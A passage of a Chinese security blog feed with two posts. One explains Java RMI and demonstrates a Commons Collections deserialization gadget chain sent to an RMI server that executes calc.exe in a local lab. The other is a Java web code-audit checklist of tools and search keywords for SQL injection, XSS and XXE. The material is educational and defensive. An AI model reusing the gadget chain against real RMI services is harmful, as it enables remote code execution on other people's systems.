<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_35733751/article/details/119862728">https://blog.csdn.net/qq_35733751/article/details/119862728</a></p>
<p><a href="https://www.freebuf.com/vuls/330087.html">https://www.freebuf.com/vuls/330087.html</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13910833.html">https://www.cnblogs.com/nice0e3/p/13910833.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之RMI反序列化</title>
    <url>/2022/06/16/Java%E5%AE%89%E5%85%A8%E4%B9%8BRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p> Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p>
<span id="more"></span>

<p>RMI可分为三大部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server: 	提供远程的对象</span><br><span class="line">Client:		调用远程的对象</span><br><span class="line">Registry:	一个注册表，存放着远程对象的位置（ip、端口、标识符）</span><br></pre></td></tr></table></figure>

<h3 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h3><ol>
<li>编写远程服务接口，该接口必须继承 java.rmi.Remote 接口，方法必须抛出java.rmi.RemoteException 异常；</li>
<li>编写远程接口实现类，该实现类必须继承 java.rmi.server.UnicastRemoteObject 类；</li>
<li>创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中；</li>
<li>编写客户端并且调用远程对象；</li>
</ol>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>1、创建远程接口，继承java.rmi.Remote接口，并且修饰符需要为<code>public</code>否则远程调用的时候会报错，并且定义的方法里面需要抛出一个<code>RemoteException</code>的异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2、实现远程接口，继承 java.rmi.server.UnicastRemoteObject类 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMIServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3、创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RMIInterface</span> <span class="variable">rmiService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIServiceImpl</span>();<span class="comment">//创建远程对象</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.bind(<span class="string">&quot;rmiService&quot;</span>, rmiService);<span class="comment">//将远程对象绑定到注册表里，并且设置为rmiService</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4、编写客户端并且调用远程对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);<span class="comment">//获取远程主机对象</span></span><br><span class="line">        <span class="type">RMIInterface</span> <span class="variable">rmiInterface</span> <span class="operator">=</span> (RMIInterface) registry.lookup(<span class="string">&quot;rmiService&quot;</span>);<span class="comment">//利用注册表的代理去查询远程注册表中名为rmiService的对象</span></span><br><span class="line">        System.out.println(rmiInterface.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果远程的这个方法有参数的话，调用该方法传入的参数必须是可序列化的。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化。客户端运行结果如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220616215129160-771244566.png" alt="image-20220616215127966"></p>
<h3 id="RMI攻击"><a href="#RMI攻击" class="headerlink" title="RMI攻击"></a>RMI攻击</h3><p>使用RMI反序列化攻击需要两个条件：第一个是接收Object类型的参数，第二就是RMI服务端存在命令执行的利用链。</p>
<p>远程接口的代码，需要定义一个Object类型的参数方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">void</span>  <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>远程接口实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMIClientSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMIServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span>  <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;say&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;work被调用了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say被调用了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">UserImpl</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>(port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">UserImpl</span><span class="params">(<span class="type">int</span> port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>(port, csf, ssf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">//RMIInterface rmiService = new RMIServiceImpl();//创建远程对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.bind(<span class="string">&quot;user&quot;</span>, user);<span class="comment">//将远程对象绑定到注册表里，并且设置为rmiService</span></span><br><span class="line">        System.out.println(<span class="string">&quot;rmi running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);//获取远程主机对象</span></span><br><span class="line"><span class="comment">//        RMIInterface rmiInterface = (RMIInterface) registry.lookup(&quot;rmiService&quot;);//利用注册表的代理去查询远程注册表中名为rmiService的对象</span></span><br><span class="line"><span class="comment">//        System.out.println(rmiInterface.sayHello());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/user&quot;</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">User</span> <span class="operator">=</span> (User) Naming.lookup(url);</span><br><span class="line">        User.work(getPayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Retention.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>客户端运行结果</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220616222718778-410745754.png" alt="image-20220616222718134"></p>
<p>之所以会弹出计算器，前面有提到过RMI在传输数据的时候，会被序列化，传输的是序列化后的数据，在传输完成后再进行反序列化。那么这时候如果传输一个恶意的序列化数据就会进行反序列化的命令执行。</p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>对RMI做了简单的了解和使用，后续会对RMI的底层进行分析…</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">https://www.cnblogs.com/nice0e3/p/13927460.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb代码审计CheckList</title>
    <url>/2022/06/16/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1CheckList/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>整理下平时Java代码审计中常见的一些漏洞学习总结以及一些审计思路，后续会不断补充。</p>
<span id="more"></span>

<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>以下为常用的工具清单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、代码编辑器：</span><br><span class="line">	1.Jetbrains IDEA(IDE)</span><br><span class="line">	2.Sublime text(文本编辑器)</span><br><span class="line">	3.Eclipse</span><br><span class="line">二、测试工具：</span><br><span class="line">	1.Burp Suite：是渗透测试工作者必备的一款工具，同时对于代码审计者和安全研究人员来说，这也是一款比较重要的测试工具，其跨平台、便捷、强大的功能以及丰富的插件，深受信息安全从业者的喜爱。</span><br><span class="line">	2.SwitchyOmega：SwitchyOmega 是一款代理管理插件，支持Firefox和Chrome浏览器，并支持HTTP、HTTPS、socket4和socket5协议。</span><br><span class="line">	3.Max HackerBar：HackBar是Firefox的一个插件，也是信息安全从业者常用的经典工具。</span><br><span class="line">	4.Postman：Postman是一款功能强大的网页调试工具，能够为用户提供强大的Web API &amp; HTTP请求调试功能。</span><br><span class="line">	5.Ysoserial：是一款开源的Java反序列化测试工具，内部集成有多种利用链，可以快速生成用于攻击的代码，也可以将新公开的反序列化漏洞利用方式自行加入Ysoserial中。</span><br><span class="line">	6.Marshalsec：是一款开源的Java反序列化测试工具，不仅可以生成各类反序列化利用链，还可以快速启动恶意的RMI服务等。</span><br><span class="line">	7.MySQL Monitor：是Web版本的SQL记录实时监控工具。</span><br><span class="line">	8.Beyond Compare：是一款文件比较工具，主要对比两个文件夹或者文件，并以颜色标示差异，比较范围包括目录、文档内容等。使用该工具可以方便代码审计人员快速地比对两个版本代码的差别。</span><br><span class="line">三、反编译工具</span><br><span class="line">	1.JD-GUI：是一款具有UI界面的反编译工具，界面简洁大方，使用简单方便。</span><br><span class="line">	2.Fernflower：功能比JD-GUI更强大，虽然没有UI界面，但可以配合系统指令完成批量反编译的工作。</span><br><span class="line">	3.CFR：功能强大的反编译工具，支持主流Java特性——Java 8 lambda表达式，以及Java 7字符串切换。在某些JD-GUI无法反编译的情况下，CFR仍然能完美地进行反编译，也可以像FernFlower那样配合系统指令进行批量反编译。</span><br><span class="line">	4.IntelliJ IDEA：具能够自动解包已添加依赖的Jar包，并对其内容进行反编译。该工具拥有强大的动态调试和字符串匹配和搜索功能，为审计和调试漏洞的工作提供了极大便利。</span><br><span class="line">	5.CodeReviewTools：是一款可以快速搜索代码中的关键点，一键对jar进行批量反编译，也支持直接对war包进行操作。</span><br><span class="line">四、Java代码静态扫描工具</span><br><span class="line">	1.Fortify SCA：获得业界认可的静态代码检查工具，但它是收费的。Fortify SCA的核心在于规则库，用户可以自定义规则库，减少误报。</span><br><span class="line">	2.VCG：基于 VB 开发的一款Windows下的白盒审计工具。VCG 支持多种语言，例如C/C++、Java、C#、VB、PL/SQL、PHP。VCG会根据代码中的变量名等信息动态生成针对该代码的漏洞规则，通过正则检查是否有和漏洞规则所匹配的代码。</span><br><span class="line">	3.FindBugs与FindSecBugs插件：FindBugs是一款Bug扫描插件，在IDEA和Eclipse中都可进行安装。FindBugs可以帮助开发人员发现代码缺陷，减少Bug，但其本身并不具备发现安全漏洞的能力，需要安装FindSecBugs拓展发现安全漏洞的能力。</span><br><span class="line">	4.SpotBugs：是FindBugs的继任者，所以二者用法基本一样，可以独立使用，也可以作为插件使用。</span><br><span class="line">	5.CheckMark：白盒代码审计解决方案，主要通过采用独特的词汇分析技术和CxQL专利查询技术对应用程序源码进行静态分析检查。</span><br><span class="line">	6.Snyk插件：修复项目中的安全漏洞、基础架构错误配置和代码质量问题。</span><br><span class="line">	7.Sensei插件：可在键入时扫描和修复易受攻击的代码 - 具有数百个可下载的安全编码配方（规则）以及内置的自行制作能力。</span><br><span class="line">	8.Reshift Security插件：可以快速发现漏洞，提供多个代码修复片段，以及丰富的文档，涵盖了每个漏洞的检测、修复和测试。</span><br><span class="line">	9.MurphySec Code Scan插件：可以快速识别您的项目中使用了哪些存在安全缺陷的开源组件，并帮助您一键修复问题。</span><br><span class="line">	10.Momo Code Sec Inspector插件：重于在编码过程中发现项目潜在的安全风险，并提供一键修复能力。</span><br><span class="line">	11.dependence-check：可用于检查已发布安全漏洞的项目依赖项。</span><br><span class="line">	12.wJa：一款结合DAST、SAST、IAST的综合性应用程序安全分析工具，支持对java web程序的安全性进行分析，含有反编译，代码审计，调试jar包，代理追踪等用于分析软件安全的功能。</span><br><span class="line">	13.tabby：是一款针对Java语言的静态代码分析工具，它使用静态分析框架 Soot 作为语义提取工具，将JAR/WAR/CLASS文件转化为代码属性图，并使用 Neo4j 图数据库来存储生成的代码属性图CPG。</span><br><span class="line">	14.SpringInspector：Java自动代码审计工具，尤其针对Spring框架，提供一个SpringBoot的Jar包即可进行自动代码审计，底层技术基于字节码分析。</span><br><span class="line">	15.gadgetinspector：反序列化漏洞利用链、漏洞检测工具。</span><br></pre></td></tr></table></figure>

<h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>审计的注意点</p>
<ul>
<li>是否使用预编译技术，预编译是否完整。</li>
<li>定位SQL语句上下文，查看是否有参数直接拼接，是否有对模糊查询关键字的过滤。</li>
<li>Mybatis框架则搜索${}，四种情况无法预编译：like模糊查询、order by排序、范围查询in、动态表名&#x2F;列名，只能拼接，所以还是需要手工防注入，此时可查看相关逻辑是否正确。</li>
<li>JPA搜索<code>JpaSort.unsafe()</code>，查看是否用实体之外的字段对查询结果排序，进行了SQL的拼接。以及查看<code>EntityManager</code>的使用，也可能存在拼接SQL的情况。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Statement</span><br><span class="line">createStatement</span><br><span class="line">PrepareStatement</span><br><span class="line">like <span class="string">&#x27;%$&#123;</span></span><br><span class="line"><span class="string">in($&#123;</span></span><br><span class="line"><span class="string">in ($&#123;</span></span><br><span class="line"><span class="string">select</span></span><br><span class="line"><span class="string">update</span></span><br><span class="line"><span class="string">insert</span></span><br><span class="line"><span class="string">delete</span></span><br><span class="line"><span class="string">$&#123;</span></span><br><span class="line"><span class="string">setObject(</span></span><br><span class="line"><span class="string">setInt(</span></span><br><span class="line"><span class="string">setString(</span></span><br><span class="line"><span class="string">setSQLXML(</span></span><br><span class="line"><span class="string">createQuery(</span></span><br><span class="line"><span class="string">createSQLQuery(</span></span><br><span class="line"><span class="string">createNativeQuery(</span></span><br></pre></td></tr></table></figure>

<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>审计的注意点</p>
<ul>
<li>定位用户的输入输出，梳理数据交互以及前端展示的过程</li>
<li>找到一条完整的利用链之后，就是结合现有的安全措施（输出编码、过滤器等）进行判断，例如是否存在绕过的可能，或者是没有任何安全防护可直接造成攻击。</li>
<li>扫描所有的 HttpServletRequest 查看相关的上下文环境。</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">request.getParamter</span><br><span class="line">&lt;%=</span><br><span class="line">param</span><br><span class="line">$&#123;</span><br><span class="line">&lt;c:out</span><br><span class="line">&lt;c:<span class="keyword">if</span></span><br><span class="line">&lt;c:forEach</span><br><span class="line">ModelAndView</span><br><span class="line">ModeMap</span><br><span class="line">Model</span><br><span class="line">request.setAttribute</span><br><span class="line">response.getWrite().print(</span><br><span class="line">response.getWrite().writer(</span><br><span class="line">XssFilter</span><br><span class="line">org.springframework.web.util.HtmlUtils</span><br><span class="line">org.apache.commons.lang3.StringEscapeUtils</span><br><span class="line">ESAPI.encoder().encodeForHTML</span><br></pre></td></tr></table></figure>

<h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>审计的注意点</p>
<ul>
<li><p>XML 解析一般在导入配置、数据传输接口等场景可能会用到，涉及到 XML 文件处理的场景可留意下 XML 解析器是否禁用外部实体，从而判断是否存在 XXE。</p>
</li>
<li><p>XML解析涉及的业务功能点： WebServices接口、RESTful接口、Excel文件解析、Soap协议等。</p>
</li>
<li><p>计XML解析器是否设置了相关的安全属性，禁用DTDs或者禁止使用外部实体。还有是否使用了不安全的漏洞组件。</p>
</li>
</ul>
<p>关键函数或字符串查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.DocumentBuilderFactory</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">javax.xml.stream.XMLInputFactory</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">org.jdom.output.XMLOutputter</span><br><span class="line">oracle.xml.parser.v2.XMLParser</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">org.dom4j.io.SAXReader </span><br><span class="line">org.dom4j.DocumentHelper</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">javax.xml.transform.sax.SAXSource </span><br><span class="line">javax.xml.transform.TransformerFactory </span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory </span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XPathExpression</span><br><span class="line">java.beans.XMLDecoder</span><br></pre></td></tr></table></figure>

<p>部分XML解析器的正确禁用方式，参考：<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</a></p>
